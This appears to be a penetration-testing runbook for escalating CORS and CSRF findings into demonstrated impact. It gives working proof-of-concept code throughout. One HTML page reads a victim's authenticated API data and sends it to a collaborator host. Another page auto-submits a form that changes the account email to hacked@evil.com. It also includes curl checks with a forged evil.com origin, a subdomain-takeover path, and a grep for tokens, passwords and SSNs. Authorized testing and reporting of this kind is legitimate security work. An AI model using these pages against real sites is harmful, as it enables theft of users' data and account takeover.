# CORS/CSRF — Runbook 04: Impact Escalation

## Purpose
Escalate from detection to demonstrable impact. Build proof-of-concept that shows real harm. All commands are SAFE -- no destructive operations.

## Variables
- `$TARGET_URL` — base URL
- `$OUTDIR` — output directory
- `$EVIDENCE_DIR` — evidence directory
- `$COLLABORATOR` — your Burp Collaborator / interactsh URL

---

## W4.1 — CORS: Exfiltrate authenticated data to collaborator

### Build the exfiltration PoC

```bash
SENSITIVE_ENDPOINT="$TARGET_URL/api/me"  # endpoint returning user data
COLLAB_URL="$COLLABORATOR"

cat > "$EVIDENCE_DIR/cors-exfil-poc.html" << 'POCEOF'
<html>
<body>
<h1>CORS Data Exfiltration PoC</h1>
<pre id="data">Stealing...</pre>
<script>
fetch('SENSITIVE_ENDPOINT_PLACEHOLDER', { credentials: 'include' })
  .then(r => r.text())
  .then(d => {
    document.getElementById('data').innerText = d;
    fetch('COLLAB_URL_PLACEHOLDER?cors_data=' + encodeURIComponent(d.substring(0,2000)));
  })
  .catch(e => document.getElementById('data').innerText = 'Error: ' + e);
</script>
</body>
</html>
POCEOF

sed -i '' "s|SENSITIVE_ENDPOINT_PLACEHOLDER|$SENSITIVE_ENDPOINT|g" "$EVIDENCE_DIR/cors-exfil-poc.html"
sed -i '' "s|COLLAB_URL_PLACEHOLDER|$COLLAB_URL|g" "$EVIDENCE_DIR/cors-exfil-poc.html"
```

### Verify exfiltration works (one-shot test)

```bash
curl -s "$SENSITIVE_ENDPOINT" \
  -H "Origin: https://evil.com" \
  ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  -o "$EVIDENCE_DIR/sensitive-data-sample.json"

echo "Sensitive fields detected:"
grep -oiE '"(email|token|api_key|secret|password|phone|address|ssn|credit|role|admin|session)[^"]*"' "$EVIDENCE_DIR/sensitive-data-sample.json" | head -20
```

---

## W4.2 — CORS: Account takeover via subdomain registration

```bash
TARGET_HOST=$(echo "$TARGET_URL" | awk -F/ '{print $3}')
CORS_ENDPOINT="$TARGET_URL/api/me"

# Check if vulnerable to subdomain origin bypass
SUBDOMAIN_ORIGIN="https://test.$TARGET_HOST"
ACAC=$(curl -s -D - -o /dev/null "$CORS_ENDPOINT" \
  -H "Origin: $SUBDOMAIN_ORIGIN" ${COOKIE_JAR:+-b "$COOKIE_JAR"} 2>/dev/null \
  | grep -i 'access-control-allow-credentials: true')

if [ -n "$ACAC" ]; then
  echo "VULNERABLE: Subdomain CORS with credentials allowed"
  echo "If you can claim 'test.$TARGET_HOST' on ${TARGET_HOST%%/*} hosting, full account takeover possible."
  echo "Impact path: register subdomain -> host PoC -> steal session tokens"
fi
```

---

## W4.3 — CSRF: Demo state-changing action

```bash
CSRF_ENDPOINT="$TARGET_URL/settings/email"  # from 03-verify

# Build CSRF PoC HTML form
cat > "$EVIDENCE_DIR/csrf-poc.html" << 'POCEOF'
<html>
<body>
<h1>CSRF PoC</h1>
<p>This page will automatically submit a request to change your email.</p>
<form id="csrf-form" action="CSRF_ENDPOINT_PLACEHOLDER" method="POST">
  <input type="hidden" name="email" value="hacked@evil.com">
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
POCEOF

sed -i '' "s|CSRF_ENDPOINT_PLACEHOLDER|$CSRF_ENDPOINT|g" "$EVIDENCE_DIR/csrf-poc.html"

echo "=== To test: host this HTML on an attacker-controlled domain and open while authenticated ==="
```

### Impact mapping by endpoint type

```bash
# Categorize vulnerable endpoints by impact
echo "=== Endpoint Impact Analysis ===" > "$EVIDENCE_DIR/impact-summary.txt"

declare -A IMPACTS=(
  ["password"]="Account takeover"
  ["email"]="Account takeover via password reset"
  ["2fa"]="Bypass 2FA"
  ["delete"]="Data destruction"
  ["transfer"]="Financial loss"
  ["admin"]="Privilege escalation"
  ["settings"]="Configuration modification"
  ["api_key"]="API key rotation / theft"
  ["invite"]="Unauthorized access grant"
  ["subscribe"]="Financial liability (subscription)"
)

for key in "${!IMPACTS[@]}"; do
  matches=$(grep -rli "$key" "$OUTDIR/cors-csrf/" 2>/dev/null | wc -l | tr -d ' ')
  if [ "$matches" -gt 0 ]; then
    echo "$key -> ${IMPACTS[$key]} (found in $matches files)" >> "$EVIDENCE_DIR/impact-summary.txt"
  fi
done
```

---

## What impact looks like per vuln class

| Vuln Class | Minimum Impact | Maximum Impact |
|---|---|---|
| CORS: origin reflection + ACAC | Read authenticated user data | Read + write user data, session theft |
| CORS: wildcard + ACAC (blocked) | Nothing (browser enforced) | If user agent bypass, full read |
| CORS: null origin + ACAC | Local file or iframe sandbox exploit | Session token theft |
| CORS: subdomain origin bypass + ACAC | If subdomain claimable: full account takeover | Mass account takeover |
| CSRF: state change without token | Single setting change | Account takeover, fund transfer, admin actions |

---

## Evidence for Report

| Artifact | Capture Command |
|---|---|
| Sensitive data in CORS response | curl -v with Origin header, save response to JSON |
| Exfiltration PoC HTML | Complete HTML file saved to $EVIDENCE_DIR/ |
| CSRF PoC HTML | Auto-submitting form demonstration |
| Before/after state (CSRF) | diff of pre/post state files |
| Impact mapping | $EVIDENCE_DIR/impact-summary.txt |

---

## Next Routing

| Result | Route |
|---|---|
| Impact demonstrated (sensitive data exfiltrated or state changed) | -> 05-evidence-collection.md |
| Impact unclear / low | -> 06-false-positive-filter.md (reassess confidence) |
| No impact path found | -> Document as informational finding only |
